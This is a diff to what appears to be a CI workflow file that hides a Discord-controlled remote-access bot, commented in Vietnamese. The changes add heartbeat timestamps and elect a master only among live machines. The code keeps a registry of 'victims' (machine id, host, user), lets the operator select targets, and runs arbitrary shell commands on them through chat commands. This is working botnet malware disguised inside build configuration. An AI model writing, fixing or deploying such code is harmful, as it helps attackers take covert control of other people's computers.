@@ -90,6 +90,7 @@ jobs:
           REG_PREFIX    = "SVCREG|"
           WEBHOOK       = ""
           _RAW          = {}
+          FRESH         = 180   # >>> FIX: giây - coi máy là "sống" nếu heartbeat trong khoảng này
 
           def _token():
               if TOKEN_URL and requests:
@@ -366,6 +367,7 @@ jobs:
                   if chans: return chans[0]
               return None
 
+          # >>> FIX: đọc timestamp heartbeat, chỉ giữ bản mới nhất, máy hiện tại luôn "sống"
           async def _scan_regs(channel):
               now = time.time()
               if now - _reg_cache["ts"] < 30 and _reg_cache["regs"]:
@@ -377,17 +379,25 @@ jobs:
                           c = msg.content
                           if c.startswith(REG_PREFIX):
                               p = c.split("|")
-                              if len(p) >= 4:
-                                  regs[p[1]] = {"id": p[1], "host": p[2], "user": p[3]}
+                              if len(p) >= 5:
+                                  try: seen = int(p[4])
+                                  except Exception: seen = 0
+                                  prev = regs.get(p[1])
+                                  if not prev or seen > prev["seen"]:
+                                      regs[p[1]] = {"id": p[1], "host": p[2],
+                                                    "user": p[3], "seen": seen}
                   except Exception: pass
-              regs.setdefault(MACHINE_ID, {"id": MACHINE_ID, "host": platform.node(),
-                                           "user": os.environ.get("USERNAME", "")})
+              regs[MACHINE_ID] = {"id": MACHINE_ID, "host": platform.node(),
+                                  "user": os.environ.get("USERNAME", ""), "seen": int(now)}
               _reg_cache["ts"] = now; _reg_cache["regs"] = regs
               return regs
 
+          # >>> FIX: chỉ bầu master trong số máy còn "sống" -> hết cảnh master là máy đã chết
           async def _is_master(channel):
               regs = await _scan_regs(channel)
-              return MACHINE_ID == min(regs.keys())
+              now = time.time()
+              live = [k for k, v in regs.items() if now - v.get("seen", 0) <= FRESH]
+              return MACHINE_ID == min(live)
 
           def get_sel():
               try: return open(SEL_FILE).read().strip() or "all"
@@ -402,9 +412,10 @@ jobs:
               except Exception: pass
 
           _reg_loop_started = [False]
+          # >>> FIX: heartbeat 600 -> 60 giây
           async def _reg_loop(ch):
               while True:
-                  await asyncio.sleep(600)
+                  await asyncio.sleep(60)
                   await _register(ch)
 
           # ============================================================
@@ -1348,10 +1359,12 @@ jobs:
 
           async def c_list(m, a):
               regs = await _scan_regs(m.channel); sel = get_sel()
+              now = time.time()
               lines = ["**🖥️ Danh sách nạn nhân:**"]
               for i, k in enumerate(sorted(regs.keys()), 1):
                   r = regs[k]; mark = "🎯" if k == sel else "▫️"
-                  lines.append(f"{mark} `{i}` · `{k}` — {r['host']} / {r['user']}")
+                  live = "" if now - r.get("seen", 0) <= FRESH else " 💀"
+                  lines.append(f"{mark} `{i}` · `{k}` — {r['host']} / {r['user']}{live}")
               lines.append(f"\nĐang điều khiển: `{sel}` · chọn `!select <số>` · về tất cả `!back`")
               await m.channel.send("\n".join(lines))
 
@@ -1370,9 +1383,12 @@ jobs:
 
           async def c_sel(m, a): await m.channel.send(f"🎯 Đang chọn: `{get_sel()}`")
 
+          # >>> FIX: master chỉ tính trên máy còn "sống"
           async def c_master(m, a):
               regs = await _scan_regs(m.channel)
-              await m.channel.send(f"👑 Master: `{min(regs.keys())}` · bạn là master: {MACHINE_ID == min(regs.keys())}")
+              now = time.time()
+              live = sorted(k for k, v in regs.items() if now - v.get("seen", 0) <= FRESH)
+              await m.channel.send(f"👑 Master (sống): `{live[0]}` · bạn là master: {MACHINE_ID == live[0]}")
 
           async def c_cmd(m, a): await send_long(m, await ex(run_cmd, " ".join(a) or "echo hello"))
           async def c_sh(m, a):
